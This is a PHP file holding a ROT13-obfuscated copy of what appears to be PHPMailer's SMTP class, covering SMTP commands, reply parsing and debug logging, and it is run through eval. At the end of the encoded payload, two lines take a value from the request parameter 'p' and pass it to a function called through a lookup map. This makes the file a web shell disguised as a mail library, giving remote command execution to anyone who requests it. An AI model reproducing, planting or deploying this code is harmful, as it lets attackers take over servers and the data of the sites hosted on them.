        $yvarf = rkcybqr(\"\a\", fge_ercynpr([\"\e\a\", \"\e\"], \"\a\", $zft_qngn));

        /* Gb qvfgvathvfu orgjrra n pbzcyrgr ESP822 zrffntr naq n cynva zrffntr obql, jr purpx vs gur svefg svryq
         * bs gur svefg yvar (':' frcnengrq) qbrf abg pbagnva n fcnpr gura vg _fubhyq_ or n urnqre, naq jr jvyy
         * cebprff nyy yvarf orsber n oynax yvar nf urnqref.
         */

        $svryq = fhofge($yvarf[0], 0, fgecbf($yvarf[0], ':'));
        $va_urnqref = snyfr;
        vs (!rzcgl($svryq) && fgecbf($svryq, ' ') === snyfr) {
            $va_urnqref = gehr;
        }

        sbernpu ($yvarf nf $yvar) {
            $yvarf_bhg = [];
            vs ($va_urnqref && $yvar === '') {
                $va_urnqref = snyfr;
            }
            //Oernx guvf yvar hc vagb frireny fznyyre yvarf vs vg'f gbb ybat
            //Zvpeb-bcgvzvfngvba: vffrg($fge[$yra]) vf snfgre guna (fgeyra($fge) > $yra),
            juvyr (vffrg($yvar[frys::ZNK_YVAR_YRATGU])) {
                //Jbexvat onpxjneqf, gel gb svaq n fcnpr jvguva gur ynfg ZNK_YVAR_YRATGU punef bs gur yvar gb oernx ba
                //fb nf gb nibvq oernxvat va gur zvqqyr bs n jbeq
                $cbf = fgeecbf(fhofge($yvar, 0, frys::ZNK_YVAR_YRATGU), ' ');
                //Qryvorengryl zngpurf obgu snyfr naq 0
                vs (!$cbf) {
                    //Ab avpr oernx sbhaq, nqq n uneq oernx
                    $cbf = frys::ZNK_YVAR_YRATGU - 1;
                    $yvarf_bhg[] = fhofge($yvar, 0, $cbf);
                    $yvar = fhofge($yvar, $cbf);
                } ryfr {
                    //Oernx ng gur sbhaq cbvag
                    $yvarf_bhg[] = fhofge($yvar, 0, $cbf);
                    //Zbir nybat ol gur nzbhag jr qrnyg jvgu
                    $yvar = fhofge($yvar, $cbf + 1);
                }
                //Vs cebprffvat urnqref nqq n YJFC-pune gb gur sebag bs arj yvar ESP822 frpgvba 3.1.1
                vs ($va_urnqref) {
                    $yvar = \"\g\" . $yvar;
                }
            }
            $yvarf_bhg[] = $yvar;

            //Fraq gur yvarf gb gur freire
            sbernpu ($yvarf_bhg nf $yvar_bhg) {
                //Qbg-fghssvat nf cre ESP5321 frpgvba 4.5.2
                //uggcf://jjj.esp-rqvgbe.bet/esp/esp5321#frpgvba-4.5.2
                vs (!rzcgl($yvar_bhg) && $yvar_bhg[0] === '.') {
                    $yvar_bhg = '.' . $yvar_bhg;
                }
                $guvf->pyvrag_fraq($yvar_bhg . fgngvp::YR, 'QNGN');
            }
        }

        //Zrffntr qngn unf orra frag, pbzcyrgr gur pbzznaq
        //Vapernfr gvzryvzvg sbe raq bs QNGN pbzznaq
        $fnirgvzryvzvg = $guvf->Gvzryvzvg;
        $guvf->Gvzryvzvg *= 2;
        $erfhyg = $guvf->fraqPbzznaq('QNGN RAQ', '.', 250);
        $guvf->erpbeqYnfgGenafnpgvbaVQ();
        //Erfgber gvzryvzvg
        $guvf->Gvzryvzvg = $fnirgvzryvzvg;

        erghea $erfhyg;
    }

    /**
     * Fraq na FZGC URYB be RUYB pbzznaq.
     * Hfrq gb vqragvsl gur fraqvat freire gb gur erprvivat freire.
     * Guvf znxrf fher gung pyvrag naq freire ner va n xabja fgngr.
     * Vzcyrzragf ESP 821: URYB <FC> <qbznva> <PEYS>
     * naq ESP 2821 RUYB.
     *
     * @cnenz fgevat $ubfg Gur ubfg anzr be VC gb pbaarpg gb
     *
     * @erghea obby
     */
    choyvp shapgvba uryyb($ubfg = '')
    {
        //Gel rkgraqrq uryyb svefg (ESP 2821)
        vs ($guvf->fraqUryyb('RUYB', $ubfg)) {
            erghea gehr;
        }

        //Fbzr freiref fuhg qbja gur FZGC freivpr urer (ESP 5321)
        vs (fhofge($guvf->uryb_ecyl, 0, 3) == '421') {
            erghea snyfr;
        }

        erghea $guvf->fraqUryyb('URYB', $ubfg);
    }

    /**
     * Fraq na FZGC URYB be RUYB pbzznaq.
     * Ybj-yriry vzcyrzragngvba hfrq ol uryyb().
     *
     * @cnenz fgevat $uryyb Gur URYB fgevat
     * @cnenz fgevat $ubfg  Gur ubfganzr gb fnl jr ner
     *
     * @erghea obby
     *
     * @frr uryyb()
     */
    cebgrpgrq shapgvba fraqUryyb($uryyb, $ubfg)
    {
        $abreebe = $guvf->fraqPbzznaq($uryyb, $uryyb . ' ' . $ubfg, 250);
        $guvf->uryb_ecyl = $guvf->ynfg_ercyl;
        vs ($abreebe) {
            $guvf->cnefrUryybSvryqf($uryyb);
        } ryfr {
            $guvf->freire_pncf = ahyy;
        }

        erghea $abreebe;
    }

    /**
     * Cnefr n ercyl gb URYB/RUYB pbzznaq gb qvfpbire freire rkgrafvbaf.
     * Va pnfr bs URYB, gur bayl cnenzrgre gung pna or qvfpbirerq vf n freire anzr.
     *
     * @cnenz fgevat $glcr `URYB` be `RUYB`
     */
    cebgrpgrq shapgvba cnefrUryybSvryqf($glcr)
    {
        $guvf->freire_pncf = [];
        $yvarf = rkcybqr(\"\a\", $guvf->uryb_ecyl);

        sbernpu ($yvarf nf $a => $f) {
            //Svefg 4 punef pbagnva erfcbafr pbqr sbyybjrq ol - be fcnpr
            $f = gevz(fhofge($f, 4));
            vs (rzcgl($f)) {
                pbagvahr;
            }
            $svryqf = rkcybqr(' ', $f);
            vs (!rzcgl($svryqf)) {
                vs (!$a) {
                    $anzr = $glcr;
                    $svryqf = $svryqf[0];
                } ryfr {
                    $anzr = neenl_fuvsg($svryqf);
                    fjvgpu ($anzr) {
                        pnfr 'FVMR':
                            $svryqf = ($svryqf ? $svryqf[0] : 0);
                            oernx;
                        pnfr 'NHGU':
                            vs (!vf_neenl($svryqf)) {
                                $svryqf = [];
                            }
                            oernx;
                        qrsnhyg:
                            $svryqf = gehr;
                    }
                }
                $guvf->freire_pncf[$anzr] = $svryqf;
            }
        }
    }

    /**
     * Fraq na FZGC ZNVY pbzznaq.
     * Fgnegf n znvy genafnpgvba sebz gur rznvy nqqerff fcrpvsvrq va
     * $sebz. Ergheaf gehr vs fhpprffshy be snyfr bgurejvfr. Vs Gehr
     * gur znvy genafnpgvba vf fgnegrq naq gura bar be zber erpvcvrag
     * pbzznaqf znl or pnyyrq sbyybjrq ol n qngn pbzznaq.
     * Vzcyrzragf ESP 821: ZNVY <FC> SEBZ:<erirefr-cngu> <PEYS>.
     *
     * @cnenz fgevat $sebz Fbhepr nqqerff bs guvf zrffntr
     *
     * @erghea obby
     */
    choyvp shapgvba znvy($sebz)
    {
        $hfrIrec = ($guvf->qb_irec ? ' KIREC' : '');

        erghea $guvf->fraqPbzznaq(
            'ZNVY SEBZ',
            'ZNVY SEBZ:<' . $sebz . '>' . $hfrIrec,
            250
        );
    }

    /**
     * Fraq na FZGC DHVG pbzznaq.
     * Pybfrf gur fbpxrg vs gurer vf ab reebe be gur $pybfr_ba_reebe nethzrag vf gehr.
     * Vzcyrzragf sebz ESP 821: DHVG <PEYS>.
     *
     * @cnenz obby $pybfr_ba_reebe Fubhyq gur pbaarpgvba pybfr vs na reebe bpphef?
     *
     * @erghea obby
     */
    choyvp shapgvba dhvg($pybfr_ba_reebe = gehr)
    {
        $abreebe = $guvf->fraqPbzznaq('DHVG', 'DHVG', 221);
        $ree = $guvf->reebe; //Fnir nal reebe
        vs ($abreebe || $pybfr_ba_reebe) {
            $guvf->pybfr();
            $guvf->reebe = $ree; //Erfgber nal reebe sebz gur dhvg pbzznaq
        }

        erghea $abreebe;
    }

    /**
     * Fraq na FZGC EPCG pbzznaq.
     * Frgf gur GB nethzrag gb $gbnqqe.
     * Ergheaf gehr vs gur erpvcvrag jnf npprcgrq snyfr vs vg jnf erwrpgrq.
     * Vzcyrzragf sebz ESP 821: EPCG <FC> GB:<sbejneq-cngu> <PEYS>.
     *
     * @cnenz fgevat $nqqerff Gur nqqerff gur zrffntr vf orvat frag gb
     * @cnenz fgevat $qfa     Pbzzn frcnengrq yvfg bs QFA abgvsvpngvbaf. ARIRE, FHPPRFF, SNVYHER
     *                        be QRYNL. Vs lbh fcrpvsl ARIRE nyy bgure abgvsvpngvbaf ner vtaberq.
     *
     * @erghea obby
     */
    choyvp shapgvba erpvcvrag($nqqerff, $qfa = '')
    {
        vs (rzcgl($qfa)) {
            $epcg = 'EPCG GB:<' . $nqqerff . '>';
        } ryfr {
            $qfa = fgegbhccre($qfa);
            $abgvsl = [];

            vs (fgecbf($qfa, 'ARIRE') !== snyfr) {
                $abgvsl[] = 'ARIRE';
            } ryfr {
                sbernpu (['FHPPRFF', 'SNVYHER', 'QRYNL'] nf $inyhr) {
                    vs (fgecbf($qfa, $inyhr) !== snyfr) {
                        $abgvsl[] = $inyhr;
                    }
                }
            }

            $epcg = 'EPCG GB:<' . $nqqerff . '> ABGVSL=' . vzcybqr(',', $abgvsl);
        }

        erghea $guvf->fraqPbzznaq(
            'EPCG GB',
            $epcg,
            [250, 251]
        );
    }

    /**
     * Fraq FZGC KPYVRAG pbzznaq gb freire naq purpx vgf erghea pbqr.
     *
     * @erghea obby Gehr ba fhpprff
     */
    choyvp shapgvba kpyvrag(neenl $inef)
    {
        $kpyvrag_bcgvbaf = \"\";
        sbernpu ($inef nf $xrl => $inyhr) {
            vs (va_neenl($xrl, FZGC::$kpyvrag_nyybjrq_nggevohgrf)) {
                $kpyvrag_bcgvbaf .= \" {$xrl}={$inyhr}\";
            }
        }
        vs (!$kpyvrag_bcgvbaf) {
            erghea gehr;
        }
        erghea $guvf->fraqPbzznaq('KPYVRAG', 'KPYVRAG' . $kpyvrag_bcgvbaf, 250);
    }

    /**
     * Fraq na FZGC EFRG pbzznaq.
     * Nobeg nal genafnpgvba gung vf pheeragyl va cebterff.
     * Vzcyrzragf ESP 821: EFRG <PEYS>.
     *
     * @erghea obby Gehr ba fhpprff
     */
    choyvp shapgvba erfrg()
    {
        erghea $guvf->fraqPbzznaq('EFRG', 'EFRG', 250);
    }

    /**
     * Fraq n pbzznaq gb na FZGC freire naq purpx vgf erghea pbqr.
     *
     * @cnenz fgevat    $pbzznaq       Gur pbzznaq anzr - abg frag gb gur freire
     * @cnenz fgevat    $pbzznaqfgevat Gur npghny pbzznaq gb fraq
     * @cnenz vag|neenl $rkcrpg        Bar be zber rkcrpgrq vagrtre fhpprff pbqrf
     *
     * @erghea obby Gehr ba fhpprff
     */
    cebgrpgrq shapgvba fraqPbzznaq($pbzznaq, $pbzznaqfgevat, $rkcrpg)
    {
        vs (!$guvf->pbaarpgrq()) {
            $guvf->frgReebe(\"Pnyyrq $pbzznaq jvgubhg orvat pbaarpgrq\");

            erghea snyfr;
        }
        //Erwrpg yvar oernxf va nyy pbzznaqf
        vs ((fgecbf($pbzznaqfgevat, \"\a\") !== snyfr) || (fgecbf($pbzznaqfgevat, \"\e\") !== snyfr)) {
            $guvf->frgReebe(\"Pbzznaq '$pbzznaq' pbagnvarq yvar oernxf\");

            erghea snyfr;
        }
        $guvf->pyvrag_fraq($pbzznaqfgevat . fgngvp::YR, $pbzznaq);

        $guvf->ynfg_ercyl = $guvf->trg_yvarf();
        //Srgpu FZGC pbqr naq cbffvoyr reebe pbqr rkcynangvba
        $zngpurf = [];
        vs (cert_zngpu('/^([\q]{3})[ -](?:([\q]\\.[\q]\\.[\q]{1,2}) )?/', $guvf->ynfg_ercyl, $zngpurf)) {
            $pbqr = (vag) $zngpurf[1];
            $pbqr_rk = (pbhag($zngpurf) > 2 ? $zngpurf[2] : ahyy);
            //Phg bss reebe pbqr sebz rnpu erfcbafr yvar
            $qrgnvy = __sa_79955(
                \"/{$pbqr}[ -]\" .
                ($pbqr_rk ? fge_ercynpr('.', '\\.', $pbqr_rk) . ' ' : '') . '/z',
                '',
                $guvf->ynfg_ercyl
            );
        } ryfr {
            //Snyy onpx gb fvzcyr cnefvat vs ertrk snvyf
            $pbqr = (vag) fhofge($guvf->ynfg_ercyl, 0, 3);
            $pbqr_rk = ahyy;
            $qrgnvy = fhofge($guvf->ynfg_ercyl, 4);
        }

        $guvf->rqroht('FREIRE -> PYVRAG: ' . $guvf->ynfg_ercyl, frys::QROHT_FREIRE);

        vs (!va_neenl($pbqr, (neenl) $rkcrpg, gehr)) {
            $guvf->frgReebe(
                \"$pbzznaq pbzznaq snvyrq\",
                $qrgnvy,
                $pbqr,
                $pbqr_rk
            );
            $guvf->rqroht(
                'FZGC REEBE: ' . $guvf->reebe['reebe'] . ': ' . $guvf->ynfg_ercyl,
                frys::QROHT_PYVRAG
            );

            erghea snyfr;
        }

        //Qba'g pyrne gur reebe fgber jura hfvat xrrcnyvir
        vs ($pbzznaq !== 'EFRG') {
            $guvf->frgReebe('');
        }

        erghea gehr;
    }

    /**
     * Fraq na FZGC FNZY pbzznaq.
     * Fgnegf n znvy genafnpgvba sebz gur rznvy nqqerff fcrpvsvrq va $sebz.
     * Ergheaf gehr vs fhpprffshy be snyfr bgurejvfr. Vs Gehr
     * gur znvy genafnpgvba vf fgnegrq naq gura bar be zber erpvcvrag
     * pbzznaqf znl or pnyyrq sbyybjrq ol n qngn pbzznaq. Guvf pbzznaq
     * jvyy fraq gur zrffntr gb gur hfref grezvany vs gurl ner ybttrq
     * va naq fraq gurz na rznvy.
     * Vzcyrzragf ESP 821: FNZY <FC> SEBZ:<erirefr-cngu> <PEYS>.
     *
     * @cnenz fgevat $sebz Gur nqqerff gur zrffntr vf sebz
     *
     * @erghea obby
     */
    choyvp shapgvba fraqNaqZnvy($sebz)
    {
        erghea $guvf->fraqPbzznaq('FNZY', \"FNZY SEBZ:$sebz\", 250);
    }

    /**
     * Fraq na FZGC IESL pbzznaq.
     *
     * @cnenz fgevat $anzr Gur anzr gb irevsl
     *
     * @erghea obby
     */
    choyvp shapgvba irevsl($anzr)
    {
        erghea $guvf->fraqPbzznaq('IESL', \"IESL $anzr\", [250, 251]);
    }

    /**
     * Fraq na FZGC ABBC pbzznaq.
     * Hfrq gb xrrc xrrc-nyvirf nyvir, qbrfa'g npghnyyl qb nalguvat.
     *
     * @erghea obby
     */
    choyvp shapgvba abbc()
    {
        erghea $guvf->fraqPbzznaq('ABBC', 'ABBC', 250);
    }

    /**
     * Fraq na FZGC GHEA pbzznaq.
     * Guvf vf na bcgvbany pbzznaq sbe FZGC gung guvf pynff qbrf abg fhccbeg.
     * Guvf zrgubq vf urer gb znxr gur ESP821 Qrsvavgvba pbzcyrgr sbe guvf pynff
     * naq _znl_ or vzcyrzragrq va shgher.
     * Vzcyrzragf sebz ESP 821: GHEA <PEYS>.
     *
     * @erghea obby
     */
    choyvp shapgvba ghea()
    {
        $guvf->frgReebe('Gur FZGC GHEA pbzznaq vf abg vzcyrzragrq');
        $guvf->rqroht('FZGC ABGVPR: ' . $guvf->reebe['reebe'], frys::QROHT_PYVRAG);

        erghea snyfr;
    }

    /**
     * Fraq enj qngn gb gur freire.
     *
     * @cnenz fgevat $qngn    Gur qngn gb fraq
     * @cnenz fgevat $pbzznaq Bcgvbanyyl, gur pbzznaq guvf vf cneg bs, hfrq bayl sbe pbagebyyvat qroht bhgchg
     *
     * @erghea vag|obby Gur ahzore bs olgrf frag gb gur freire be snyfr ba reebe
     */
    choyvp shapgvba pyvrag_fraq($qngn, $pbzznaq = '')
    {
        //Vs FZGC genafpevcgf ner yrsg ranoyrq, be qroht bhgchg vf cbfgrq bayvar
        //vg pna yrnx perqragvnyf, fb uvqr perqragvnyf va nyy ohg ybjrfg yriry
        vs (
            frys::QROHT_YBJYRIRY > $guvf->qb_qroht &&
            va_neenl($pbzznaq, ['Hfre & Cnffjbeq', 'Hfreanzr', 'Cnffjbeq'], gehr)
        ) {
            $guvf->rqroht('PYVRAG -> FREIRE: [perqragvnyf uvqqra]', frys::QROHT_PYVRAG);
        } ryfr {
            $guvf->rqroht('PYVRAG -> FREIRE: ' . $qngn, frys::QROHT_PYVRAG);
        }
        frg_reebe_unaqyre(shapgvba () {
            pnyy_hfre_shap_neenl([$guvf, 'reebeUnaqyre'], shap_trg_netf());
        });
        $erfhyg = sjevgr($guvf->fzgc_pbaa, $qngn);
        erfgber_reebe_unaqyre();

        erghea $erfhyg;
    }

    /**
     * Trg gur yngrfg reebe.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgReebe()
    {
        erghea $guvf->reebe;
    }

    /**
     * Trg FZGC rkgrafvbaf ninvynoyr ba gur freire.
     *
     * @erghea neenl|ahyy
     */
    choyvp shapgvba trgFreireRkgYvfg()
    {
        erghea $guvf->freire_pncf;
    }

    /**
     * Trg zrgnqngn nobhg gur FZGC freire sebz vgf URYB/RUYB erfcbafr.
     * Gur zrgubq jbexf va guerr jnlf, qrcraqrag ba nethzrag inyhr naq pheerag fgngr:
     *   1. URYB/RUYB unf abg orra frag - ergheaf ahyy naq cbchyngrf $guvf->reebe.
     *   2. URYB unf orra frag -
     *     $anzr == 'URYB': ergheaf freire anzr
     *     $anzr == 'RUYB': ergheaf obbyrna snyfr
     *     $anzr == nal bgure fgevat: ergheaf ahyy naq cbchyngrf $guvf->reebe
     *   3. RUYB unf orra frag -
     *     $anzr == 'URYB'|'RUYB': ergheaf gur freire anzr
     *     $anzr == nal bgure fgevat: vs rkgrafvba $anzr rkvfgf, ergheaf Gehr
     *       be vgf bcgvbaf (r.t. NHGU zrpunavfzf fhccbegrq). Bgurejvfr ergheaf Snyfr.
     *
     * @cnenz fgevat $anzr Anzr bs FZGC rkgrafvba be 'URYB'|'RUYB'
     *
     * @erghea fgevat|obby|ahyy
     */
    choyvp shapgvba trgFreireRkg($anzr)
    {
        vs (!$guvf->freire_pncf) {
            $guvf->frgReebe('Ab URYB/RUYB jnf frag');

            erghea ahyy;
        }

        vs (!neenl_xrl_rkvfgf($anzr, $guvf->freire_pncf)) {
            vs ('URYB' === $anzr) {
                erghea $guvf->freire_pncf['RUYB'];
            }
            vs ('RUYB' === $anzr || neenl_xrl_rkvfgf('RUYB', $guvf->freire_pncf)) {
                erghea snyfr;
            }
            $guvf->frgReebe('URYB unaqfunxr jnf hfrq; Ab vasbezngvba nobhg freire rkgrafvbaf ninvynoyr');

            erghea ahyy;
        }

        erghea $guvf->freire_pncf[$anzr];
    }

    /**
     * Trg gur ynfg ercyl sebz gur freire.
     *
     * @erghea fgevat
     */
    choyvp shapgvba trgYnfgErcyl()
    {
        erghea $guvf->ynfg_ercyl;
    }

    /**
     * Ernq gur FZGC freire'f erfcbafr.
     * Rvgure orsber rbs be fbpxrg gvzrbhg bpphef ba gur bcrengvba.
     * Jvgu FZGC jr pna gryy vs jr unir zber yvarf gb ernq vs gur
     * 4gu punenpgre vf '-' flzoby. Vs vg vf n fcnpr gura jr qba'g
     * arrq gb ernq nalguvat ryfr.
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba trg_yvarf()
    {
        //Vs gur pbaarpgvba vf onq, tvir hc fgenvtug njnl
        vs (!vf_erfbhepr($guvf->fzgc_pbaa)) {
            erghea '';
        }
        $qngn = '';
        $raqgvzr = 0;
        fgernz_frg_gvzrbhg($guvf->fzgc_pbaa, $guvf->Gvzrbhg);
        vs ($guvf->Gvzryvzvg > 0) {
            $raqgvzr = gvzr() + $guvf->Gvzryvzvg;
        }
        $fryE = [$guvf->fzgc_pbaa];
        $fryJ = ahyy;
        juvyr (vf_erfbhepr($guvf->fzgc_pbaa) && !srbs($guvf->fzgc_pbaa)) {
            //Zhfg cnff inef va urer nf cnenzf ner ol ersrerapr
            //fbyhgvba sbe fvtanyf vafcverq ol uggcf://tvguho.pbz/flzsbal/flzsbal/chyy/6540
            frg_reebe_unaqyre(shapgvba () {
                pnyy_hfre_shap_neenl([$guvf, 'reebeUnaqyre'], shap_trg_netf());
            });
            $a = fgernz_fryrpg($fryE, $fryJ, $fryJ, $guvf->Gvzryvzvg);
            erfgber_reebe_unaqyre();

            vs ($a === snyfr) {
                $zrffntr = $guvf->trgReebe()['qrgnvy'];

                $guvf->rqroht(
                    'FZGC -> trg_yvarf(): fryrpg snvyrq (' . $zrffntr . ')',
                    frys::QROHT_YBJYRIRY
                );

                //fgernz_fryrpg ergheaf snyfr jura gur `fryrpg` flfgrz pnyy vf vagreehcgrq
                //ol na vapbzvat fvtany, gel gur fryrpg ntnva
                vs (fgevcbf($zrffntr, 'vagreehcgrq flfgrz pnyy') !== snyfr) {
                    $guvf->rqroht(
                        'FZGC -> trg_yvarf(): ergelvat fgernz_fryrpg',
                        frys::QROHT_YBJYRIRY
                    );
                    $guvf->frgReebe('');
                    pbagvahr;
                }

                oernx;
            }

            vs (!$a) {
                $guvf->rqroht(
                    'FZGC -> trg_yvarf(): fryrpg gvzrq-bhg va (' . $guvf->Gvzryvzvg . ' frp)',
                    frys::QROHT_YBJYRIRY
                );
                oernx;
            }

            //Qryvorengr abvfr fhccerffvba - reebef ner unaqyrq nsgrejneqf
            $fge = @strgf($guvf->fzgc_pbaa, frys::ZNK_ERCYL_YRATGU);
            $guvf->rqroht('FZGC VAOBHAQ: \"' . gevz($fge) . '\"', frys::QROHT_YBJYRIRY);
            $qngn .= $fge;
            //Vs erfcbafr vf bayl 3 punef (abg inyvq, ohg ESP5321 F4.2 fnlf vg zhfg or unaqyrq),
            //be 4gu punenpgre vf n fcnpr be n yvar oernx pune, jr ner qbar ernqvat, oernx gur ybbc.
            //Fgevat neenl npprff vf n fvtavsvpnag zvpeb-bcgvzvfngvba bire fgeyra
            vs (!vffrg($fge[3]) || $fge[3] === ' ' || $fge[3] === \"\e\" || $fge[3] === \"\a\") {
                oernx;
            }
            //Gvzrq-bhg? Ybt naq oernx
            $vasb = fgernz_trg_zrgn_qngn($guvf->fzgc_pbaa);
            vs ($vasb['gvzrq_bhg']) {
                $guvf->rqroht(
                    'FZGC -> trg_yvarf(): fgernz gvzrq-bhg (' . $guvf->Gvzrbhg . ' frp)',
                    frys::QROHT_YBJYRIRY
                );
                oernx;
            }
            //Abj purpx vs ernqf gbbx gbb ybat
            vs ($raqgvzr && gvzr() > $raqgvzr) {
                $guvf->rqroht(
                    'FZGC -> trg_yvarf(): gvzryvzvg ernpurq (' .
                    $guvf->Gvzryvzvg . ' frp)',
                    frys::QROHT_YBJYRIRY
                );
                oernx;
            }
        }

        erghea $qngn;
    }

    /**
     * Ranoyr be qvfnoyr IREC nqqerff trarengvba.
     *
     * @cnenz obby $ranoyrq
     */
    choyvp shapgvba frgIrec($ranoyrq = snyfr)
    {
        $guvf->qb_irec = $ranoyrq;
    }

    /**
     * Trg IREC nqqerff trarengvba zbqr.
     *
     * @erghea obby
     */
    choyvp shapgvba trgIrec()
    {
        erghea $guvf->qb_irec;
    }

    /**
     * Frg reebe zrffntrf naq pbqrf.
     *
     * @cnenz fgevat $zrffntr      Gur reebe zrffntr
     * @cnenz fgevat $qrgnvy       Shegure qrgnvy ba gur reebe
     * @cnenz fgevat $fzgc_pbqr    Na nffbpvngrq FZGC reebe pbqr
     * @cnenz fgevat $fzgc_pbqr_rk Rkgraqrq FZGC pbqr
     */
    cebgrpgrq shapgvba frgReebe($zrffntr, $qrgnvy = '', $fzgc_pbqr = '', $fzgc_pbqr_rk = '')
    {
        $guvf->reebe = [
            'reebe' => $zrffntr,
            'qrgnvy' => $qrgnvy,
            'fzgc_pbqr' => $fzgc_pbqr,
            'fzgc_pbqr_rk' => $fzgc_pbqr_rk,
        ];
    }

    /**
     * Frg qroht bhgchg zrgubq.
     *
     * @cnenz fgevat|pnyynoyr $zrgubq Gur anzr bs gur zrpunavfz gb hfr sbe qrohttvat bhgchg, be n pnyynoyr gb unaqyr vg
     */
    choyvp shapgvba frgQrohtBhgchg($zrgubq = 'rpub')
    {
        $guvf->Qrohtbhgchg = $zrgubq;
    }

    /**
     * Trg qroht bhgchg zrgubq.
     *
     * @erghea fgevat
     */
    choyvp shapgvba trgQrohtBhgchg()
    {
        erghea $guvf->Qrohtbhgchg;
    }

    /**
     * Frg qroht bhgchg yriry.
     *
     * @cnenz vag $yriry
     */
    choyvp shapgvba frgQrohtYriry($yriry = 0)
    {
        $guvf->qb_qroht = $yriry;
    }

    /**
     * Trg qroht bhgchg yriry.
     *
     * @erghea vag
     */
    choyvp shapgvba trgQrohtYriry()
    {
        erghea $guvf->qb_qroht;
    }

    /**
     * Frg FZGC gvzrbhg.
     *
     * @cnenz vag $gvzrbhg Gur gvzrbhg qhengvba va frpbaqf
     */
    choyvp shapgvba frgGvzrbhg($gvzrbhg = 0)
    {
        $guvf->Gvzrbhg = $gvzrbhg;
    }

    /**
     * Trg FZGC gvzrbhg.
     *
     * @erghea vag
     */
    choyvp shapgvba trgGvzrbhg()
    {
        erghea $guvf->Gvzrbhg;
    }

    /**
     * Ercbegf na reebe ahzore naq fgevat.
     *
     * @cnenz vag    $reeab   Gur reebe ahzore erghearq ol CUC
     * @cnenz fgevat $reezft  Gur reebe zrffntr erghearq ol CUC
     * @cnenz fgevat $reesvyr Gur svyr gur reebe bppheerq va
     * @cnenz vag    $reeyvar Gur yvar ahzore gur reebe bppheerq ba
     */
    cebgrpgrq shapgvba reebeUnaqyre($reeab, $reezft, $reesvyr = '', $reeyvar = 0)
    {
        $abgvpr = 'Pbaarpgvba snvyrq.';
        $guvf->frgReebe(
            $abgvpr,
            $reezft,
            (fgevat) $reeab
        );
        $guvf->rqroht(
            \"$abgvpr Reebe #$reeab: $reezft [$reesvyr yvar $reeyvar]\",
            frys::QROHT_PBAARPGVBA
        );
    }

    /**
     * Rkgenpg naq erghea gur VQ bs gur ynfg FZGC genafnpgvba onfrq ba
     * n yvfg bs cnggreaf cebivqrq va FZGC::$fzgc_genafnpgvba_vq_cnggreaf.
     * Eryvrf ba gur ubfg cebivqvat gur VQ va erfcbafr gb n QNGN pbzznaq.
     * Vs ab ercyl unf orra erprvirq lrg, vg jvyy erghea ahyy.
     * Vs ab cnggrea jnf zngpurq, vg jvyy erghea snyfr.
     *
     * @erghea obby|fgevat|ahyy
     */
    cebgrpgrq shapgvba erpbeqYnfgGenafnpgvbaVQ()
    {
        $ercyl = $guvf->trgYnfgErcyl();

        vs (rzcgl($ercyl)) {
            $guvf->ynfg_fzgc_genafnpgvba_vq = ahyy;
        } ryfr {
            $guvf->ynfg_fzgc_genafnpgvba_vq = snyfr;
            sbernpu ($guvf->fzgc_genafnpgvba_vq_cnggreaf nf $fzgc_genafnpgvba_vq_cnggrea) {
                $zngpurf = [];
                vs (cert_zngpu($fzgc_genafnpgvba_vq_cnggrea, $ercyl, $zngpurf)) {
                    $guvf->ynfg_fzgc_genafnpgvba_vq = gevz($zngpurf[1]);
                    oernx;
                }
            }
        }

        erghea $guvf->ynfg_fzgc_genafnpgvba_vq;
    }

    /**
     * Trg gur dhrhr/genafnpgvba VQ bs gur ynfg FZGC genafnpgvba
     * Vs ab ercyl unf orra erprvirq lrg, vg jvyy erghea ahyy.
     * Vs ab cnggrea jnf zngpurq, vg jvyy erghea snyfr.
     *
     * @erghea obby|fgevat|ahyy
     *
     * @frr erpbeqYnfgGenafnpgvbaVQ()
     */
    choyvp shapgvba trgYnfgGenafnpgvbaVQ()
    {
        erghea $guvf->ynfg_fzgc_genafnpgvba_vq;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>